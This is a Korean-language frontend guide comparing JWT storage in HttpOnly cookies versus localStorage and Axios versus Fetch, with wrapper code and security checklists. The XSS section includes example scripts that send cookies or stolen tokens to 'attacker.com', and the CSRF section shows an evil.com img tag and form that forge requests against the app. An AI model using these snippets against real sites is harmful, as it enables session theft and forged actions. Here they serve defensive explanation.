# JWT 토큰 저장 방식 & HTTP 클라이언트 비교 분석

## 🎯 Frontend 관점 기술 결정 가이드

### 1️⃣ 토큰 저장 방식: Cookie vs localStorage

#### 📊 비교표

| 항목 | HttpOnly Cookie | localStorage |
|-----|----------------|--------------|
| **XSS 공격 방어** | ✅ 우수 (JS 접근 불가) | ❌ 취약 (JS 접근 가능) |
| **CSRF 공격 방어** | ⚠️ 취약 (자동 전송) | ✅ 안전 (수동 전송) |
| **저장 용량** | 4KB | 5-10MB |
| **서버 부담** | 모든 요청마다 전송 | 필요시에만 전송 |
| **모바일 앱 호환성** | ⚠️ 제한적 | ✅ 우수 |
| **CORS 처리** | ⚠️ 복잡 (credentials) | ✅ 간단 |
| **만료 관리** | ✅ 자동 (Expires) | ❌ 수동 구현 |
| **디버깅** | ⚠️ 어려움 | ✅ 쉬움 |

---

#### 🔐 보안 관점 상세 분석

##### XSS (Cross-Site Scripting) 공격

**HttpOnly Cookie 방식:**
```javascript
// ✅ 프론트엔드에서 토큰에 접근 불가
document.cookie // "auth_token" 항목이 보이지 않음

// 공격자가 XSS 스크립트를 삽입해도 토큰 탈취 불가능
<script>
  fetch('https://attacker.com', {
    method: 'POST',
    body: document.cookie // HttpOnly 쿠키는 전송되지 않음
  });
</script>
```

**localStorage 방식:**
```javascript
// ❌ 프론트엔드에서 토큰에 접근 가능
const token = localStorage.getItem('auth_token');

// 공격자가 XSS 스크립트를 삽입하면 토큰 탈취 가능
<script>
  const stolenToken = localStorage.getItem('auth_token');
  fetch('https://attacker.com', {
    method: 'POST',
    body: JSON.stringify({ token: stolenToken })
  });
</script>
```

**XSS 방어 전략 (localStorage 사용 시):**
- Content Security Policy (CSP) 설정
- Input Sanitization (사용자 입력 정제)
- Output Encoding (출력 인코딩)
- Trusted Types API 사용

---

##### CSRF (Cross-Site Request Forgery) 공격

**Cookie 방식의 취약점:**
```html
<!-- 공격자 사이트 (evil.com) -->
<img src="https://choresboard.com/api/boards/ABC123/delete">
<!-- 사용자가 로그인 상태라면 쿠키가 자동으로 전송되어 보드가 삭제됨 -->

<form action="https://choresboard.com/api/boards" method="POST">
  <input name="title" value="Hacked Board">
  <!-- 자동 제출 스크립트 -->
</form>
```

**CSRF 방어 전략 (Cookie 사용 시):**
1. **SameSite 속성 설정**
```javascript
Set-Cookie: auth_token=xxx; SameSite=Strict; HttpOnly; Secure
```

2. **CSRF 토큰 사용**
```javascript
// 서버에서 CSRF 토큰 발급
<meta name="csrf-token" content="random-csrf-token">

// API 요청 시 CSRF 토큰 함께 전송
fetch('/api/boards', {
  method: 'POST',
  headers: {
    'X-CSRF-Token': document.querySelector('meta[name="csrf-token"]').content
  }
});
```

**localStorage 방식:**
```javascript
// ✅ 자동 전송되지 않으므로 CSRF 공격에 안전
fetch('https://choresboard.com/api/boards', {
  method: 'POST',
  headers: {
    'Authorization': `Bearer ${localStorage.getItem('auth_token')}` // 수동으로만 전송
  }
});
```

---

#### 🏗️ 아키텍처 관점

##### Cookie 방식의 장점
1. **자동 관리**: 브라우저가 만료, 전송을 자동 처리
2. **서버 중심**: 서버에서 토큰 생명주기 완전 제어
3. **전통적 웹앱**: SSR(Server-Side Rendering)과 자연스러운 통합

##### localStorage 방식의 장점
1. **SPA 친화적**: React, Vue 등 SPA 아키텍처와 잘 맞음
2. **명시적 제어**: 개발자가 토큰 전송을 완전히 제어
3. **디버깅 용이**: 개발자 도구에서 쉽게 확인 가능
4. **모바일 앱 확장**: React Native, Electron 등과 호환성 우수

---

#### 💡 추천: 현재 프로젝트 상황 분석

**현재 프로젝트 특성:**
- ✅ SPA (Vanilla TypeScript)
- ✅ RESTful API (JWT 기반)
- ✅ 모바일 반응형 UI
- ✅ CORS 환경 (프론트엔드-백엔드 분리)
- ⚠️ XSS 방어 메커니즘: 확인 필요
- ⚠️ CSP 설정: 확인 필요

**추천: localStorage + 보안 강화**

**이유:**
1. **백엔드 가이드 준수**: 백엔드 팀이 localStorage 사용 권장
2. **SPA 아키텍처**: localStorage가 SPA 패턴과 더 잘 맞음
3. **명시적 제어**: Authorization 헤더를 수동으로 관리하여 CSRF 방어
4. **디버깅 편의성**: 개발 과정에서 토큰 확인 및 테스트 용이
5. **확장성**: 향후 모바일 앱 확장 시 동일한 방식 사용 가능

**필수 보안 조치:**
```typescript
// 1. Content Security Policy 설정 (index.html)
<meta http-equiv="Content-Security-Policy"
      content="default-src 'self';
               script-src 'self';
               style-src 'self' 'unsafe-inline';">

// 2. XSS 방어를 위한 입력 검증
function sanitizeInput(input: string): string {
  const div = document.createElement('div');
  div.textContent = input;
  return div.innerHTML;
}

// 3. 토큰 만료 검증
function isTokenExpired(token: string): boolean {
  try {
    const payload = JSON.parse(atob(token.split('.')[1]));
    return Date.now() >= payload.exp * 1000;
  } catch {
    return true;
  }
}
```

---

### 2️⃣ HTTP 클라이언트: Axios vs Fetch

#### 📊 비교표

| 항목 | Axios | Fetch API |
|-----|-------|-----------|
| **브라우저 지원** | IE11+ (polyfill) | Modern browsers only |
| **번들 크기** | ~13KB (gzip) | 0KB (네이티브) |
| **Interceptors** | ✅ 내장 | ❌ 수동 구현 |
| **자동 JSON 변환** | ✅ 자동 | ❌ 수동 (.json()) |
| **요청 취소** | ✅ CancelToken | ✅ AbortController |
| **진행률 추적** | ✅ onUploadProgress | ⚠️ 복잡 |
| **타임아웃** | ✅ timeout 옵션 | ❌ 수동 구현 |
| **에러 처리** | ✅ HTTP 에러 자동 reject | ❌ 수동 확인 필요 |
| **기본 URL 설정** | ✅ baseURL | ❌ 수동 구현 |
| **학습 곡선** | 낮음 | 낮음 |

---

#### 🎨 코드 비교

##### 1. 기본 GET 요청

**Fetch:**
```typescript
async function fetchUserBoards() {
  const token = localStorage.getItem('auth_token');

  const response = await fetch('http://localhost:8080/api/users/me/boards', {
    method: 'GET',
    headers: {
      'Authorization': `Bearer ${token}`,
      'Content-Type': 'application/json'
    }
  });

  if (!response.ok) {
    throw new Error(`HTTP ${response.status}`);
  }

  return response.json();
}
```

**Axios:**
```typescript
import axios from 'axios';

const apiClient = axios.create({
  baseURL: 'http://localhost:8080/api',
  timeout: 5000
});

// Interceptor로 토큰 자동 추가
apiClient.interceptors.request.use(config => {
  const token = localStorage.getItem('auth_token');
  if (token) {
    config.headers.Authorization = `Bearer ${token}`;
  }
  return config;
});

async function fetchUserBoards() {
  const response = await apiClient.get('/users/me/boards');
  return response.data; // 자동으로 JSON 파싱됨
}
```

---

##### 2. POST 요청 with Error Handling

**Fetch:**
```typescript
async function createBoard(title: string) {
  const token = localStorage.getItem('auth_token');

  try {
    const response = await fetch('http://localhost:8080/api/boards', {
      method: 'POST',
      headers: {
        'Authorization': `Bearer ${token}`,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({ title })
    });

    if (!response.ok) {
      const errorData = await response.json();
      throw new Error(errorData.message || `HTTP ${response.status}`);
    }

    return response.json();
  } catch (error) {
    console.error('Failed to create board:', error);
    throw error;
  }
}
```

**Axios:**
```typescript
apiClient.interceptors.response.use(
  response => response,
  error => {
    if (error.response?.status === 401) {
      // 자동 로그아웃 처리
      localStorage.removeItem('auth_token');
      window.location.href = '/';
    }
    return Promise.reject(error);
  }
);

async function createBoard(title: string) {
  try {
    const response = await apiClient.post('/boards', { title });
    return response.data;
  } catch (error) {
    console.error('Failed to create board:', error);
    throw error;
  }
}
```

---

##### 3. 401 에러 자동 처리

**Fetch (수동 구현):**
```typescript
async function handleApiResponse<T>(response: Response): Promise<T> {
  if (response.status === 401) {
    localStorage.removeItem('auth_token');
    localStorage.removeItem('authUser');
    window.location.href = '/';
    throw new Error('Unauthorized');
  }

  if (!response.ok) {
    const error = await response.json();
    throw new Error(error.message);
  }

  return response.json();
}
```

**Axios (Interceptor 활용):**
```typescript
apiClient.interceptors.response.use(
  response => response,
  error => {
    if (error.response?.status === 401) {
      localStorage.removeItem('auth_token');
      localStorage.removeItem('authUser');
      window.location.href = '/';
    }
    return Promise.reject(error);
  }
);
```

---

#### 💡 추천: 현재 프로젝트 상황 분석

**현재 프로젝트 특성:**
- ✅ 이미 Fetch 기반 구현 완료
- ✅ 번들 크기 최소화 필요 (모바일 대응)
- ✅ 현대적 브라우저 타겟 (ES6+)
- ⚠️ Interceptor 패턴 필요 (JWT 자동 추가)
- ⚠️ 401 에러 통합 처리 필요

**추천 1: Fetch API + 수동 Wrapper (현재 상태 유지 개선)**

**장점:**
- ✅ 번들 크기 0KB 증가 (네이티브 API)
- ✅ 이미 구현된 코드 재활용
- ✅ 추가 의존성 없음
- ✅ 가볍고 빠른 성능

**단점:**
- ❌ Interceptor 수동 구현 필요
- ❌ 각 API 호출마다 반복 코드

**구현 예시:**
```typescript
// src/utils/apiClient.ts
class ApiClient {
  private baseURL = 'http://localhost:8080/api';

  private async request<T>(
    endpoint: string,
    options: RequestInit = {}
  ): Promise<T> {
    const token = localStorage.getItem('auth_token');
    const url = `${this.baseURL}${endpoint}`;

    const config: RequestInit = {
      ...options,
      headers: {
        'Content-Type': 'application/json',
        ...(token && { 'Authorization': `Bearer ${token}` }),
        ...options.headers,
      },
    };

    const response = await fetch(url, config);

    // 401 에러 자동 처리
    if (response.status === 401) {
      this.handleUnauthorized();
      throw new Error('Unauthorized');
    }

    if (!response.ok) {
      const error = await response.json();
      throw new Error(error.message || `HTTP ${response.status}`);
    }

    return response.status === 204 ? null : response.json();
  }

  private handleUnauthorized() {
    localStorage.removeItem('auth_token');
    localStorage.removeItem('authUser');
    window.location.href = '/';
  }

  get<T>(endpoint: string): Promise<T> {
    return this.request<T>(endpoint, { method: 'GET' });
  }

  post<T>(endpoint: string, data?: any): Promise<T> {
    return this.request<T>(endpoint, {
      method: 'POST',
      body: JSON.stringify(data),
    });
  }

  put<T>(endpoint: string, data?: any): Promise<T> {
    return this.request<T>(endpoint, {
      method: 'PUT',
      body: JSON.stringify(data),
    });
  }

  delete<T>(endpoint: string): Promise<T> {
    return this.request<T>(endpoint, { method: 'DELETE' });
  }

  patch<T>(endpoint: string, data?: any): Promise<T> {
    return this.request<T>(endpoint, {
      method: 'PATCH',
      body: JSON.stringify(data),
    });
  }
}

export const apiClient = new ApiClient();
```

**사용 예시:**
```typescript
// 기존 코드
const response = await fetch(`${BASE_URL}/users/me/boards`, {
  headers: createApiHeaders()
});
const data = await handleApiResponse(response);

// 개선된 코드
const data = await apiClient.get('/users/me/boards');
```

---

**추천 2: Axios (장기적 관점)**

**장점:**
- ✅ Interceptor 패턴 내장
- ✅ 자동 JSON 변환
- ✅ 타임아웃, 진행률 등 고급 기능
- ✅ 대규모 프로젝트에서 검증됨

**단점:**
- ❌ 13KB 번들 크기 증가
- ❌ 추가 학습 곡선
- ❌ 기존 코드 마이그레이션 필요

**구현 예시:**
```typescript
// src/utils/axiosClient.ts
import axios from 'axios';

const axiosClient = axios.create({
  baseURL: 'http://localhost:8080/api',
  timeout: 10000,
  headers: {
    'Content-Type': 'application/json',
  },
});

// Request Interceptor: JWT 자동 추가
axiosClient.interceptors.request.use(
  config => {
    const token = localStorage.getItem('auth_token');
    if (token) {
      config.headers.Authorization = `Bearer ${token}`;
    }
    return config;
  },
  error => Promise.reject(error)
);

// Response Interceptor: 401 에러 자동 처리
axiosClient.interceptors.response.use(
  response => response,
  error => {
    if (error.response?.status === 401) {
      localStorage.removeItem('auth_token');
      localStorage.removeItem('authUser');
      window.location.href = '/';
    }
    return Promise.reject(error);
  }
);

export { axiosClient };
```

---

### 🎯 최종 추천 결정

#### 현재 프로젝트에 최적화된 선택

| 항목 | 추천 | 이유 |
|-----|------|------|
| **토큰 저장** | **localStorage** | • 백엔드 가이드 준수<br>• SPA 아키텍처 적합<br>• CSRF 안전<br>• 디버깅 편의성 |
| **HTTP 클라이언트** | **Fetch + Wrapper** | • 번들 크기 0KB<br>• 이미 구현된 코드 재활용<br>• 충분한 기능 제공<br>• 모바일 성능 우수 |

#### 구현 우선순위

1. **즉시 적용 (필수):**
   - ✅ 토큰 저장을 localStorage로 변경
   - ✅ Fetch Wrapper 클래스 생성 (apiClient)
   - ✅ 401 에러 자동 처리 통합

2. **단기 (1-2주):**
   - ⚠️ Content Security Policy 설정
   - ⚠️ XSS 방어 입력 검증
   - ⚠️ 토큰 만료 검증 로직

3. **중장기 (필요시):**
   - 💡 Axios 마이그레이션 검토 (프로젝트 규모 확대 시)
   - 💡 HttpOnly Cookie 전환 검토 (보안 강화 시)

---

### 📝 구현 체크리스트

#### localStorage + Fetch 구현

- [x] `cookies.ts` → `auth.ts`로 리팩토링
- [ ] localStorage 기반 토큰 저장/조회/삭제
- [ ] Fetch Wrapper 클래스 생성
- [ ] Authorization 헤더 자동 추가
- [ ] 401 에러 통합 처리
- [ ] 토큰 만료 검증 로직
- [ ] CSP 설정
- [ ] XSS 방어 입력 검증

#### 보안 강화

- [ ] Content-Security-Policy 헤더 설정
- [ ] 사용자 입력 sanitization
- [ ] 토큰 만료 시간 검증
- [ ] HTTPS 강제 (프로덕션)
- [ ] Secure flag 설정 고려

---

### 🔍 참고 자료

#### 토큰 저장 보안
- [OWASP - Token Storage](https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#local-storage)
- [Auth0 - Where to Store Tokens](https://auth0.com/docs/secure/security-guidance/data-security/token-storage)

#### Fetch vs Axios
- [MDN - Fetch API](https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API)
- [Axios Documentation](https://axios-http.com/docs/intro)

#### JWT 보안 베스트 프랙티스
- [JWT.io - Best Practices](https://jwt.io/introduction)
- [RFC 8725 - JWT Best Current Practices](https://datatracker.ietf.org/doc/html/rfc8725)
